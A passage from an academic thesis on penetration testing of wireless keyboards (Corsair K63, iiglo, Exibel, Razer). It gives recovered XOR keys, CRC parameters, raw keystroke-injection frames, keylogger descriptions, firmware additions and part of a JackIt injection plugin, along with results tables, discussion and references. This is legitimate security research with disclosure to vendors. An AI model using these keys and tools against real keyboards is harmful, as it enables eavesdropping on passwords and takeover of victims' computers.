the result could be used to get the bit for any transmitted key .
0xCE01CA9DAD8D39B03C7417E8F15701BB01172D39 (A)
⊕0x0000000000200000000000000000000000000000 (A bitmask )
=0xCE01CA9DADCD39B03C7417E8F15701BB01172D39 (XOR key )
With the extracted XOR key any transmission could be XORed and a single
bit would be left as a 1 corresponding to the key pressed. All the keys could
be mapped out and a lookup table could be built to translate the bits to their
Penetration test | 99
corresponding key . These bits were correlated to the physical location of the
keys on the keyboard which also resulted in the keys ’ A ’ , ’S’, and ’D’ all having
the 6thbyte and adjacent bits as the location for their bitmasks. A full lookup
table can be found in Appendix A.7 .
4.2.4.2 Exploitation
A simple keylogger was constructed using the XOR key, the lookup table, and
the Crazyradio P A. By listening to transmissions of the correct length and
XORing them with the XOR key a single bit would be left and this bit was
translated to a key using the lookup table and the output was then printed.
This keylogging does not work perfectly because the Corsair K63 seems to
be switching channels in an unpredictable way and therefore not all keystrokes
can be guaranteed to be captured. A small example can be seen in Figure 4.106
where the string “secret password” was typed on the keyboard attached to the
victim’s computer.
Figure 4.106: Sniﬀing keystrokes on the Corsair K63 Wireless with the string
“secret password” typed
T o test keystroke injection the Crazyradio P A was set to continuously trans-
100 | Penetration test
mit0xCE01CA9DAD8D39B03C7417E8F15701BB01172D39 , which is
the value for an ’ A ’ . The result was a large number of ’ A ’s being written to
the victim’s computer which indicated that keystroke injection was possible.
The Corsair protocol was thereafter implemented into the JackIt software and
automatic payload creation could be performed. The code can be found in
Appendix A.4 .
4.2.4.3 Post Exploitation
The Corsair protocol boasts about 128-bit AES encryption but the only defense
against eavesdropping seems to be XORing with a static key and channel
hopping. The channel hopping makes eavesdropping somewhat unpredictable
but this problem could be solved from an attacker’s point of view by using
several radios listening on different channels or by listening on a wider band
and using signal processing to extract the individual channels. When it comes
to the initial problem statement both of the questions Is it possible to listen
in on what is being typed? and Is it possible to send keystrokes without
physical access to the keyboard? can be answered with Y es with the caveat
that listening can be somewhat unpredictable. However, if an attacker has
keystroke injection the host system is already compromised and other forms
of keyloggers and more advanced persistence can be obtained. As an added
bonus the ability to “disable encryption” exists in the keyboard software, but
the transmitted data remains the same regardless of how the setting is toggled.
4.2.4.4 Reporting
The vulnerabilities were present in firmware version V 3.1.3 which was the
latest version and these vulnerabilities were reported to Corsair.
4.2.5 iiglo Protocol
This section describes the rest of the penetration testing steps for the iiglo
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.5.1 ), exploitation
of the protocol (Section 4.2.5.2 ), post exploitation details (Section 4.2.5.3 ),
and finally what was reported (Section 4.2.5.4 ).
4.2.5.1 Vulnerability Analysis
The iiglo protocol was different from the other protocols and was determined
to not be a variant of the Enhanced Shockburst protocol because the protocol
Penetration test | 101
lacked the Packet Control Field, see Figure 4.101 . Diﬀiculties in determining
the details of the protocol resulted in further recording of key presses other than
the ’ A ’ , ’S’, and ’D’ keys. Buttons from the Consumer Page (0x0C) Usage Page
of the USB HID Usage Page definitions [ 25] were pressed since these buttons
may generate USB HID packets of length 3 instead of the usual length 8, these
include special buttons that perform tasks such as opening the calculator or
searching in the currently selected application. A difference can be observed
in Figure 4.107 where the length of the frame for the special button is shorter
than the length of the frames for regular keys.
Figure 4.107: The iiglo protocol when a special button is pressed.
The observed differences were used to draw further conclusions about the
protocol and it was determined that the portion of the protocol highlighted
with a yellow color was determined to most likely be the address, and the area
highlighted in green was determined to be some form of type field indicating
that the transmission was containing keyboard key presses (transmissions
from the mouse were very similar but the repeating 0x12 0x12 0x12 was
replaced with some other value). The rest of the protocol was investigated
further and a view of a subset of the bits in the protocol can be seen in
Figure 4.108 .
Figure 4.108: A zoomed-in view of the bits in the iiglo protocol.
102 | Penetration test
The green area was already established to be a type field, and the area
marked in red was determined to contain the length of the data. The binary
value represented in the red area was 3 for the first row which contained the
transmission of the special key, and 8 for the rest of the transmissions with
regular keys pressed. The columns labeled 66 and 67 seemed to be some form
of 2-bit sequence number but some messages seem to be lost or transmitted
over different frequencies. The column labeled 68 was observed to be a
constant 0. The columns labeled 69 to 72 were also a constant 0 followed
by 4 columns of alternating values that were indeterminable. The columns
labeled 77 and on-wards were identical for key presses of the same key for 56
bits (7 bytes) followed by what appeared to be a 16-bit changing value, most
likely the key payload followed by a checksum of some sort. Since column 77
was only consistent for 56 bits (7 bytes) and the presumed length field had the
value 8 it was determined that the ’data’ part of the frame started at column
69 and contained the 64 bits (8 bytes) following it (this is the reason column
68 was marked blue to keep it separate from the following 0-bits that were
determined to be a part of the data segment). The protocol can therefore be
roughly described as in Figure 4.109 .
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
Address
T ype Len Seq 0
0 Unknown Payload 0-31 bytes}
Full Data
Checksum
Figure 4.109: iiglo protocol details
T o determine the actual key payload some experimentation had to be
performed. It was quickly concluded that the key payload for the press of the
’ A ’ button was 0xf53f0d6d2af9bc and the key payload for the ’S’ button
was0xf52d0d6d2af9bc . They are very similar so an attempt was made
in XORing the two values to see if some pattern emerged.
0xf53f0d6d2af9bc (A)
⊕0xf52d0d6d2af9bc (S)
=0x00120000000000
As suspected a pattern emerged as the result was mostly zeros with a 0x12
at the second byte. This pattern indicated that the key payload is most likely
USB HID data XORed with a predetermined XOR key as 0x12 is the result
Penetration test | 103
of0x04⊕0x16 which are the USB Human Interface device keyboard key
codes definition according to the USB standard [ 25], for the keys ’ A ’ and ’S’ .
The format also fits these criteria since the first byte is usually reserved for
modifier flags and the following 6 bytes can represent 6 different keys pressed
at the same time, just as defined in the 8-byte keyboard input report in the HID
specifications (excluding padding byte) [ 25].
By XORing 0xf53f0d6d2af9bc with0x00040000000000 the
XOR key was recovered.
0xf53f0d6d2af9bc (A)
⊕0x00040000000000 (A USB keycode )
=0xF53B0D6D2AF9BC (XOR key )
The next step in reverse engineering the protocol was to understand the
checksum. Just as with the Plexgear protocol the tool CRC RevEng was used∗.
A number of different samples were loaded into the tool and the parameters
for a 16-bit CRC could be brute forced, as can be seen in Figure 4.110 . The
recovered parameters were 0x1021 as the polynomial and 0xde60 as the
initialisation.
Figure 4.110: The execution and results of CRC RevEng that give a correct
checksum algorithm for the iiglo protocol
4.2.5.2 Exploitation
Suﬀicient information on the protocol was thus recovered to be able to perform
simple keylogging. A simple keylogger was constructed using the XOR
key, the USB key code definitions, and the Crazyradio P A. By listening to
transmissions of the correct length and XORing them with the XOR key the
USB key code would be left and by using the USB HID documentation [ 25]
all keys could be translated to their respective buttons and a clear text view
∗https://reveng.sourceforge.io/
104 | Penetration test
of the entered data could be recovered. A small example can be seen in
Figure 4.111 where the string “secret password” was typed on the keyboard
attached to the victim’s computer. Not all of the keystrokes are received by
the key logger and this is most likely because of frequency hopping. The
key logger only listens on 1 channel and some of the keys are most likely
transmitted on different channels. This is similar to the corsair protocol and
an adversary could circumvent this in the same way for the iiglo keyboard
as for the Corsair keyboard. The assumptions made about the format of the
payload were confirmed correct as well and the first byte is for the modifier
flags (Shift, Ctrl, etc.) and the following 6 bytes for 6 keys.
Figure 4.111: Sniﬀing keystrokes on an iiglo keyboard with the string “secret
password” typed
The protocol was not fully understood with an unknown part and
sequence numbers that were increasing in an unexpected way but keystroke
injection was attempted anyway . The Crazyradio P A was set to transmit
0x1212124000F53F0D6D2AF9BC6569 and a single ’ A ’ could be
observed on the victim computer. This demonstrated that keystroke injection
was possible and to take this to the next step the RFStorm nRF24LU1+
Research Firmware was modified to include checksum calculations to be
able to identify keyboards using the iiglo protocol without knowing their
address. The support for checksum calculations was added to the non-generic
promiscuous mode and thus the radio could now listen to all traﬀic and send
Penetration test | 105
the correct frames to the host computer when found.
The iiglo protocol was then implemented into JackIt and automatic payload
creation could be performed. Experiments with the generating code resulted
in that it is possible to reliably create payloads even without knowing some
part of the protocol. The unknown part of the protocol (Seq and Unknown
in Figure 4.109 ) were all set to 0 and as long as the transmissions for each key
were repeated around 10 times all of the keys were successfully received by
the victim computer. The code can be found in Appendix A.5 .
4.2.5.3 Post Exploitation
Eavesdropping on the keystrokes of the iiglo protocol proved harder than
keystroke injection because of the channel hopping but as stated before,
channel hopping can be defeated by a determined adversary and if keystroke
injection is possible then key logging can be achieved via software as well.
When it comes to the initial problem statement both of the questions Is it
possible to listen in on what is being typed? and Is it possible to send
keystrokes without physical access to the keyboard? can be answered with
Y es with the caveat that listening can be somewhat unpredictable.
The proof of concepts demonstrates that the iiglo protocol contains flaws
and that keyboards using it are vulnerable to both sniﬀing and injection.
4.2.5.4 Reporting
The vulnerabilities were reported to the manufacturer.
4.2.6 Exibel Protocol
This section describes the rest of the penetration testing steps for the Exibel
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.6.1 ), exploitation
of the protocol (Section 4.2.6.2 ), post exploitation details (Section 4.2.6.3 ),
and finally what was reported (Section 4.2.6.4 ).
4.2.6.1 Vulnerability Analysis
The Exibel protocol was quickly identified as being an Enhanced Shockburst
protocol based on the present Packet Control Field and the checksum was
verified with 0x1021 as the polynomial and 0xffff as the initialization.
The only missing part of the Exibel protocol was therefore the data part
106 | Penetration test
of the Enhanced Shockburst. When the buttons ’ A ’ , ’S’, and ’D’ were
pressed the data part can be observed to contain 0x04 and0x04 which are
already established as the USB key codes for ’ A ’ and ’S’ [ 25], this can be
seen in Figure 4.82 . The protocol was further experimented with using the
Crazyradio P A and it was observed that the first byte contains modifier keys
such as Shift, Alt, and Ctrl. The last byte of the data part can also be observed
to contain some information as seen in Figure 4.81 . Experimentation using the
Crazyradio P A showed this to be the least significant byte of the sum of the
rest of the data part, which can be calculated by adding the data and ANDing
the sum with 0xff .
4.2.6.2 Exploitation
A simple keylogger was created and the string “secret password” was typed
on the keyboard attached to the victim computer. The results can be seen
in Figure 4.112 .
Figure 4.112: Sniﬀing keystrokes on an Exibel keyboard with the string “secret
password” typed
Penetration test | 107
T o test keystroke injection the Crazyradio P A was instructed to contin-
uously transmit 0x00 0x04 0x00 ... 0x04 to send the keycode for
the key ’ A ’ . The result was large amounts of ’a’s being typed on the victim
computer. This indicated that keystroke injection was possible and the details
of the Exibel protocol were added to JackIt to facilitate automatic payload
creation. The code can be found in Appendix A.6 .
4.2.6.3 Post Exploitation
The keylogging proof of concept demonstrated the ability to listen in on what
was being typed and thus the answer to the first sub-question of the initial
problem statement, i.e., Is it possible to listen in on what is being typed? , is
Y es .
The result of the keystroke injection experimentation also resulted in that
the sub-question Is it possible to send keystrokes without physical access to
the keyboard? is also answered with Y es .
The Exibel protocol is therefore considered insecure and usage of wireless
peripherals from Exibel should not be used in security-critical situations.
4.2.6.4 Reporting
The vulnerabilities were reported to Clas Ohlson.
4.2.7 Razer Protocol
This section describes the rest of the penetration testing steps for the Exibel
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.7.1 ), exploitation
of the protocol (Section 4.2.7.2 ), post exploitation details (Section 4.2.7.3 ),
and finally what was reported (Section 4.2.7.4 ).
4.2.7.1 Vulnerability Analysis
From the first part of the vulnerability analysis, the Razer protocol was
observed to transmit enormous amounts of transmissions compared to the
other protocols. The amount of data transmitted made the analysis of the
protocol very time-consuming and the full details could not be recovered.
However, some details were recovered and the protocol seems to start with
an address field of 4 bytes followed by a length field of 5 bits. The protocol
then differs between transmissions depending on if the length field is long
108 | Penetration test
or short. The long transmissions differ in such a regard that no discernible
information can be gathered. The short transmissions however can be used to
at least understand the short transmission slightly more.
Following the length field, the short transmissions have a repeating 3-bit
field following the pattern 0 2 5 7 1 3 6 . The next section is a static 9-bit
field with the value 0x9a0 . Following this is a 3-bit section counting down in
increments of 2 modulo 7, the pattern is thus 5 3 1 6 4 2 0 which then
repeats. The subsequent section contains 12 static bits which at the time of
the recording had the value a25 . The following three sections contain three
different counters, 4 bits counting down, 3 bits counting up, and 3 bits counting
down. When the last counter hits 0and wraps around the second to last counter
is incremented by 1, and when this counter hits 7and wraps around, the first
counter is decremented by 1. These sections are followed by a single bit that
initially started as a 1 but turned into a 0 when some button was pressed. This
is followed by a constant 0 bit, followed by 16 changing bits, followed by a
constant 1. The changing 16 bits were assumed to be some sort of checksum
but nothing could be recovered using CRC RevEng. The recovered details can
be seen illustrated in Figure 4.113 .
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
Address
Length Count Static Count Static
Count Count Count ?0 CRC 1
Figure 4.113: razer protocol details
4.2.7.2 Exploitation
As the protocol is not fully understood any key logging was not possible.
Keystroke injection was attempted by re-transmitting 0x61,0xf0,0xe4,
0x35,0xec,0x92,0x9c,0x04,0x7e,0x5f,0xc0,0x38,0x99,
0xe3,0x59,0x68,0x72,0xc0 but nothing could be observed on the
victim computer.
Penetration test | 109
4.2.7.3 Post Exploitation
The Razer protocol could not be shown to be vulnerable to either key sniﬀing
or keystroke injection and thus the answer to both of the sub-questions from the
problem statement are answered with No . This, however, does not mean that
the Razer protocol is unhackable, given more time and effort put into reverse
engineering the protocol it is still possible that there could be some form of
vulnerability present but the testing performed for the purposes of this thesis
could not show any vulnerabilities. It is possible that Razer, unlike Corsair,
actually encrypts the transmissions of keystrokes and if that is the case then
Razer has built a strong solid protocol. The Razer protocol has shown to be
more diﬀicult to reverse engineer than any other analysed protocol covered in
this thesis.
4.2.7.4 Reporting
No vulnerabilities were reported to Razer.
110 | Penetration test
Summary of Penetration T esting Results | 111
Chapter 5
Summary of Penetration Test-
ing Results
The penetration testing described in the previous chapter showed that a
majority of the protocols had vulnerabilities that enabled keystroke injection
or key sniﬀing. The outlying keyboard was the Razer BlackWidow V3 which
could not be shown to be vulnerable to either. The summarised results per
protocol are shown in T able 5.1 .
T able 5.1: Summary of the penetration test per protocol
Protocol Sniﬀing Injection
Plexgear Y es Y es
Rapoo Y es Y es
Logitech No Y es
Corsair Y es Y es
iiglo Y es Y es
Exibel Y es Y es
Razer No No
The per-protocol results as expanded back into per keyboard results to
reflect the initial problem statement are shown in T able 5.2 .
112 | Summary of Penetration T esting Results
T able 5.2: Summary of penetration test per keyboard
V endor Model Sniﬀing Injection
Plexgear Mediatrack Edge X Y es Y es
Plexgear KM-Silent Y es Y es
Deltaco TB-122 Y es Y es
Clas Ohlson 38-6600 Y es Y es
Rapoo E9100M Y es Y es
Logitech MK270 No Y es
Corsair K63 Wireless Y es Y es
iiglo MK610 Y es Y es
Exibel 38-8940 Y es Y es
Razer BlackWidow V3 Pro No No
Discussion | 113
Chapter 6
Discussion
Section 6.1 analyzes the results of the penetration testing. Section 6.2
discusses the methodology used for the penetration testing. Finally,
Section 6.3 discusses the limitations of this research.
6.1 Analysis of results
The results show that 9 out of 10 keyboards have at least some form of
vulnerability . Out of all the keyboards, 8 of them were shown to contain new
previously unknown vulnerabilities that could grant an attacker full control
of the computer of the keyboard. The severity of these vulnerabilities in
combination with how prevalent they are show that the usage of wireless
keyboards should in no way be used in any situation where security, privacy,
or integrity is of any concern whatsoever. The vulnerabilities require an
adversary to perform some amount of preparation, and have some extra
hardware and knowledge of the target victim but with the developed software
tools as a part of this thesis and the inexpensiveness of the hardware, these
hurdles are very minimal, or next to nonexistent for a determined adversary .
In addition, several of the keyboards were observed to be using the same
protocol even though they were branded completely differently and sold in
different stores. This is most likely an indication that the keyboards are
produced by some external part and then branded differently depending on the
purchasing company . The external part is therefore very likely to be selling
keyboards under many different brands all over the world and there is a high
probability that the same vulnerabilities found in this thesis are present in a
vast amount of wireless keyboards all branded differently .
114 | Discussion
Out of all the keyboards, only one of them actually promised any form of
encryption as part of the marketing of the keyboard and this is the Corsair K63
Wireless. The keyboard is marketed with 128-bit AES encryption but as the
results of the penetration test show, this is not the case. The keyboard’s only
obfuscation of the wireless transmission is a simple XOR of the payload with
a static key that can potentially be reverse engineered automatically with some
very simple calculations. The keyboard documentation also states that there is
a possibility to disable the encryption to achieve lower latency but the setting
does not seem to be doing anything at all. A case could potentially be made
that Corsair is using false advertising in the sale of their products since:
(a) The promised encryption does not exist, luring the customers into a false
sense of security .
(b) The ability to disable encryption does not work, tricking customers that
they have a choice of reduced latency or not.
However, this is probably merely the result of some bug in their software.
Razer BlackWidow V3 Pro was the only keyboard not shown to contain any
vulnerability . As a result of this, it is deemed the most secure of the targeted
keyboards but it could still be vulnerable to some unidentified vulnerability
that requires more time and resources compared to the rest of the keyboards.
6.2 Discussion of methodology
The methodology using the penetration testing framework by Weidman [ 4]
proved fruitful in discovering vulnerabilities in most of the keyboards.
The framework assisted in keeping a structured approach to each step and
prevented the research from getting too sidetracked at times.
The potential downside is that it may be possible that other types of
vulnerabilities could have been found if another framework was used, and that
the framework could have been adapted to work with wireless keyboards in a
more eﬀicient way . Part of this could have been a less reduced threat modeling
so as to keep the research on an even narrower path. Initial extra questioning
of what was actually being researched could have helped reduce unnecessary
time spent on non-questions. For example, if the research in addition to the
penetration testing framework directly aimed to answer several sub-questions
such as:
Discussion | 115
1. Where are the transmissions sent?
2. What happens at those frequencies?
3. How are the transmissions sent?
4. How is the data interpreted?
5. What does the data consist of?
6. How do the payloads look?
Then there would not have been as much time spent on the most basic parts of
the penetration test.
Regardless of this, the framework was very suitable for the research and
this is reflected in the results.
6.3 Limitations
The research only investigated 10 different keyboards of which 1 of them
already had a previously known vulnerability . The limited number of different
keyboards means that nothing can be guaranteed for wireless keyboards that
have not been analyzed. As such it could be possible that all other wireless
keyboards except the ones analyzed in this project and the ones shown
previously vulnerable are in fact secure. However, this is extraordinarily
unlikely – but as these other wireless keyboards have not been analyzed
nothing can be said with certainty about other wireless keyboards.
116 | Discussion
Conclusions and Future work | 117
Chapter 7
Conclusions and Future work
Section 7.1 presents the conclusions drawn from this work. Section 7.2
suggests future work that could build upon the results of this work or expand
the breadth of the conclusions. Finally, Section 7.3 gives some reflections on
the ethical and sustainable development aspects of this work.
7.1 Conclusions
The posed research question asked what security issues exist in typical wireless
keyboards and the concluded answer is that both listening in on what is being
typed and being able to type on the keyboard are both security issues that are
prevalent in the analyzed keyboards. A determined adversary will be able to
take control of your computer with these keyboards connected and there is
little to none that can be done to protect yourself except to unplug the USB
dongle from your computer.
Perhaps these vulnerabilities are also prevalent in other wireless key-
boards, but more research needs to be done to confirm or deny this. As a
security researcher, my own opinion is that wireless keyboards, in the state
of the industry right now, should not be used in any situation that does not
absolutely require them.
Looking back at the purpose of this research, the intent was to aid
manufacturers and consumers in making more security-minded decisions
when purchasing and producing wireless keyboards. Hopefully, consumers
will refrain from purchasing wireless keyboards with known security flaws,
and hopefully, manufacturers will take the research being done on the area
to heart when designing new products so as to not keep producing flawed
products.
118 | Conclusions and Future work
What also became apparent from the research is that manufacturer claims
of security should not be taken as a guarantee that the product is in fact secure.
Independent reviews of security claims are currently required to make sure that
products are working as intended which is very unfortunate, but is something
fellow security researchers now are promoted to perform! Consumers should
be able to trust that the products they purchase are working as intended and
are as secure as the manufacturer claims but that is not currently the reality of
the situation.
As part of the project, several sub-goals were established to satisfy the
requirements of the industry, the scientific expectations, and the academic
goals. These goals have all been achieved in one way or another as a result
of the research. The industry goal of finding and reporting at least one
vulnerability was successfully completed since all found vulnerabilities were
reported. The scientific goal of finding at least one previously unknown
vulnerability was completed since 8 new keyboards were found vulnerable,
and the missing AES encryption of Corsair K63 Wireless further bolstered
this. The academic goal of producing suﬀicient findings to be able to draw
conclusions from the work in such a way that future work can be built upon
them was also completed since the tools and methods used and produced
as part of this thesis and the conclusions drawn from the 8 new vulnerable
keyboards make a good foundation for further analysis of wireless keyboards.
7.2 Future work
This section suggests some directions for future work. The most obvious
of these is to increase the number of different wireless keyboards that are
examined (Section 7.2.1 ). While this research looked at sniﬀing and injection
by examination of the wireless transmission, it would also be interesting to
examine the wireless keyboards by doing an analysis of the hardware and
firmware in the keyboards (Section 7.2.2 ). Finally, it would be useful to
automate the reverse engineering of the CRC (Section 7.2.3 ).
7.2.1 Other Keyboards
As the research was limited to a handful of keyboards further research on
other keyboards would be very interesting to be able to draw more certain
conclusions on the state of all wireless keyboards. The more keyboards that
are analyzed, the greater the certainty of the conclusions with regard to the
Conclusions and Future work | 119
industry as a whole. An added benefit would be that consumers would be able
to know what product(s) to avoid.
7.2.2 Hardware analysis
The hardware of the keyboards was not analyzed in any depth in this thesis. An
interesting approach would be to try to reverse engineer the keyboard protocols
and potential security features by extracting the firmware from the chips of the
keyboards themselves. Perhaps this could be more fruitful and produce more
advanced results in cases where the protocols are more advanced or encrypted.
This has previously partly been done by Klostermeier and Deeg [ 27][28] for
some keyboards but it would be interesting to take this prior work a step further.
7.2.3 Automatic CRC reversing
Part of the protocol reverse engineering was to reverse the checksum algorithm
used. In all reverse engineered cases, this was some type of CRC-16 and it
should be possible to implement automatic reverse engineering of these in
a more robust way other than taking the output of the recorded signals and
running them through a tool such as CRC RevEng. This could then aid in
figuring out what each part of the frame is, without having to do as much
manual work.
7.3 Reflections
The potential economic aspects of the work are first, users that use a secure
keyboard are less likely to be the victim of attacks, such as ransomware and
other financially motivated cybercrime. Secondly, the manufacturers who
produce insecure devices may see a reduction in sales as consumers chose
not to purchase vulnerable devices.
The ethical aspect of the research is in large part connected to the reporting
of vulnerabilities. It could be argued that it is unethical to aid adversaries in
finding vulnerabilities they can use for illicit gain but the reporting is done
in a responsible way so as to give manufacturers a chance to fix the issues
before they can be abused. Reporting vulnerabilities is beneficial for everyone
when the vulnerabilities have been fixed since it removes the possibility of
them being used without the manufacturers’ knowledge and gives the general
public information on which products are secure to use and which are not.
120 | Conclusions and Future work
Environmentally the research has next to no direct impact. The security
aspects of a wireless keyboard are not going to affect any environmental
decisions and the only environmental impact is the electricity usage of a
computer which does not differ in any meaningful way if the keyboard is
wireless or not. However, there can be an indirect environmental impact as
consumers may decide to recycle their vulnerable keyboards.
References | 121
References
[1] T . Schroeder and M. Moser, “Practical exploitation of modern wireless
devices: Keykeriki V2,” Presentation at CanSecWest 2010, V ancouver,
Canada, Mar. 2010. [Online]. A vailable: http://www.remote-exploit.
org/content/keykeriki_v2_cansec_v1.1.pdf [Page 1.]
[2] S. Kamkar, “KeySweeper,” Sep. 2016. [Online]. A vailable: https:
//samy.pl/keysweeper/ [Page 1.]
[3] A. D. Householder, G. W assermann, A. Manion, and C. King, “The
CERT Guide to Coordinated Vulnerability Disclosure,” CERT , T ech.
Rep., May 2019. [Online]. A vailable: https://vuls.cert.org/confluence/
display/CVD/2.5.+Ethical+Considerations [Page 2.]
[4] G. Weidman, P enetration testing: a hands-on introduction to hacking .
No Starch Press, 2014. ISBN 978-1593275648 [Pages 3,13, and 114 .]
[5] M. Berner, “Where’s My Car? Ethical Hacking of a Smart Garage,”
Master’s thesis, KTH Royal Institute of T echnology, School of Electrical
Engineering and Computer Science, 2020. [Online]. A vailable: http:
//urn.kb.se/resolve?urn=urn:nbn:se:kth:diva-280298 [Pages 3and 13.]
[6] International T elecommunication Union, “Radio Regulations.” [Online].
A vailable: https://www.itu.int/pub/R-REG-RR-2020 [Page 5.]
[7] U. S. Federal Communications Commission, “ Amendment of Part 15
of the Commission’s Rules Regarding Spread Spectrum Devices,”
Aug. 2000. [Online]. A vailable: https://www.fcc.gov/document/
amendment-part-15-commissions-rules-regarding-spread-spectrum
[Page 6.]
[8] Mohammed AlMahamdy, “Lecture Notes in “Digital
Communications”.” [Online]. A vailable: https://www.uoanbar.edu.
iq/eStoreImages/Bank/2969.pdf [Page 6.]
122 | References
[9] J. Pohl and A. Noack, “ Automatic Wireless Protocol Reverse
Engineering,” in 13th USENIX Workshop on Offensive T echnologies
(WOOT 19) . Santa Clara, CA: USENIX Association, Aug.
2019. [Online]. A vailable: https://www.usenix.org/conference/woot19/
presentation/pohl [Page 7.]
[10] T . V . Ramabadran and S. S. Gaitonde, “ A tutorial on CRC
computations,” IEEE Micro , vol. 8, no. 4, pp. 62–75, 1988. doi:
10.1109/40.7773 [Page 8.]
[11] M. N. Sadiku and C. M. Akujuobi, “Software-defined radio: a brief
overview,” IEEE Potentials , vol. 23, no. 4, pp. 14–15, 2004. doi:
10.1109/MP .2004.1343223 [Page 8.]
[12] D. E. Mann and S. M. Christey, “T owards a common enumeration
of vulnerabilities,” Presentation at 2nd W orkshop on Research
with Security Vulnerability Databases on January 21-22, 1999
at Purdue University in West Lafayette, Indiana, USA, Jan.
1999. [Online]. A vailable: https://www.cve.org/Resources/General/
Towards-a-Common-Enumeration-of-Vulnerabilities.pdf [Page 8.]
[13] The MITRE Corporation, “CVE,” Aug. 2022. [Online]. A vailable:
https://www.cve.org/ [Page 8.]
[14] T . Goodspeed, “Promiscuity is the nRF24L01+’s Duty,” Feb.
2011. [Online]. A vailable: http://travisgoodspeed.blogspot.com/2011/
02/promiscuity-is-nrf24l01s-duty.html [Page 9.]
[15] Bastille Threat Research T eam, “RFStorm nRF24LU1+ Research
Firmware,” Jul. 2016. [Online]. A vailable: https://github.com/
BastilleResearch/nrf-research-firmware [Pages 9,18,86, and 90.]
[16] M. Newlin, “MouseJack, KeySniffer and Beyond: Keystroke
Sniﬀing and Injection Vulnerabilities in 2.4 GHz
Wireless Mice and Keyboards,” DEFCON , 2016. [Online].
A vailable: https://media.defcon.org/DEF%20CON%2024/DEF%
20CON%2024%20presentations/DEF%20CON%2024%20-%
20Marc-Newlin-MouseJack-Injecting-Keystrokes-Into-Wireless-Mice-WP-UPDATED.
pdf [Pages 9,17,53,90, and 95.]
[17] INTERELECTRONIX, “USA and NATO T empest standards,” 2022.
[Online]. A vailable: https://www.interelectronix.com/se/tempest.html
[Page 10.]
References | 123
[18] R. W ang, H. W ang, and E. Dubrova, “Far field em side-channel attack on
aes using deep learning,” in Proceedings of the 4th ACM Workshop on
Attacks and Solutions in Hardware Security , 2020, pp. 35–44. [Page 11.]
[19] “Nmap: the Network Mapper,” Aug. 2022. [Online]. A vailable:
https://nmap.org/ [Page 14.]
[20] Open Web Application Security Project, “OW ASP T op T en,”
GitHub project, Oct. 2021. [Online]. A vailable: https://owasp.org/
www-project-top-ten/ [Page 15.]
[21] S. Christey and C. Wysopal, “Responsible Vulnerability Disclosure
Process,” Internet Engineering T ask Force, Internet-Draft draft-
christey-wysopal-vuln-disclosure-00, Feb. 2002, draft expired on
August 2002. [Online]. A vailable: https://datatracker.ietf.org/doc/
draft-christey-wysopal-vuln-disclosure/00/ [Page 16.]
[22] J. Pohl and A. Noack, “Universal Radio Hacker: A Suite for
Analyzing and Attacking Stateful Wireless Protocols,” in 12th USENIX
Workshop on Offensive T echnologies (WOOT 18) . Baltimore, MD:
USENIX Association, 2018. [Online]. A vailable: https://www.usenix.
org/conference/woot18/presentation/pohl [Pages 18 and 22.]
[23] ——, “Universal radio hacker: A suite for wireless protocol analysis,”
in Proceedings of the 2017 Workshop on Internet of Things Security
and Privacy , ser. Io TS&P ’17. New Y ork, NY , USA: Association for
Computing Machinery, 2017. doi: 10.1145/3139937.3139951. ISBN
9781450353960 p. 59–60. [Online]. A vailable: https://doi-org.focus.lib.
kth.se/10.1145/3139937.3139951 [Page 18.]
[24] Nordic Semiconductor, “nRF24LU1+ Single Chip 2.4GHz
Transceiver with USB Microcontroller and Flash Memory,”
Nordic Semiconductor, Datasheet Revision 1.0, Jan. 2019.
[Online]. A vailable: https://www.sparkfun.com/datasheets/Wireless/
Nordic/nRF24LU1P_1_0.pdf [Pages 22 and 90.]
[25] USB Implementers’ Forum, “HID Usage T ables.” [Online]. A vailable:
https://usb.org/sites/default/files/hut1_3_0.pdf [Pages 92,93,101 ,103 ,
and 106 .]
[26] ——, “USB Device Class Definition for Human Interface Devices
(HID).” [Online]. A vailable: https://www.usb.org/sites/default/files/
documents/hid1_11.pdf [Page 92.]
124 | References
[27] G. Klostermeier and M. Deeg, “Of mice and keyboards:
On the security of modern wireless desktop sets,” SySS
GmbH, Schaffhausenstraße 77, 72072 Tübingen, Germany,
IT SECURITY KNOW - HOW , Jun. 2018. [Online].
A vailable: https://www.syss.de/fileadmin/dokumente/Publikationen/
2017/2017_06_01_of-mice-and-keyboards_paper.pdf [Page 119 .]
[28] ——, “Case study: Security of modern bluetooth
keyboards,” SySS GmbH, Schaffhausenstraße 77, 72072
Tübingen, Germany, IT SECURITY KNOW - HOW , Jun.
2017. [Online]. A vailable: https://www.exploit-db.com/docs/english/
44929-security-of-modern-bluetooth-keyboards.pdf [Page 119 .]
Appendix A: Supporting material | 125
Appendix A
Supporting material
A.1 Plexgear firmware additions
Listing A.1: Code added to radio.c of the RFStorm nRF24LU1+ Research
Firmware to add support for the Plexgear protocol
// Plexgear
if((payload[3] & 0xf0) == 0x20){
flip_crc = 0xd83f;
for(x=3; x < 6;x++){
flip_crc = crc_update(flip_crc,payload[x],8);
}
if((flip_crc >> 8) == payload[7] && (flip_crc & 0xff) == payload[6]){
memcpy(in1buf, payload, pm_prefix_length + pm_payload_length);
in1bc = pm_prefix_length + pm_payload_length;
flush_rx();
return;
}
}
if((payload[4] & 0xf0) == 0x20){
flip_crc = 0xd83f;
for(x=4; x < 7;x++){
flip_crc = crc_update(flip_crc,payload[x],8);
}
if((flip_crc >> 8) == payload[8] && (flip_crc & 0xff) == payload[7]){
memcpy(in1buf, payload, pm_prefix_length + pm_payload_length);
in1bc = pm_prefix_length + pm_payload_length;
flush_rx();
return;
}
}
126 | Appendix A: Supporting material
A.2 Plexgear JackIt plugin
Listing A.2: Code to JackIt to enable automatic payload creation for the
Plexgear protocol
# -*- coding: utf-8 -*-
frombinascii importcrc32
fromjackit.plugins.crc importcrc
classHID( object):
’’’ Injection code for Plexgear keyboard ’’’
def__init__(self, address, payload):
self.address = address
self.device_vendor = ’Plexgear’
self.payload_template = [0x00,0x00,0x00,0x00,0x00,0xff]
self.count = 1
self.odd = 0
self.mapping = {
” ”: [0x39, 0],
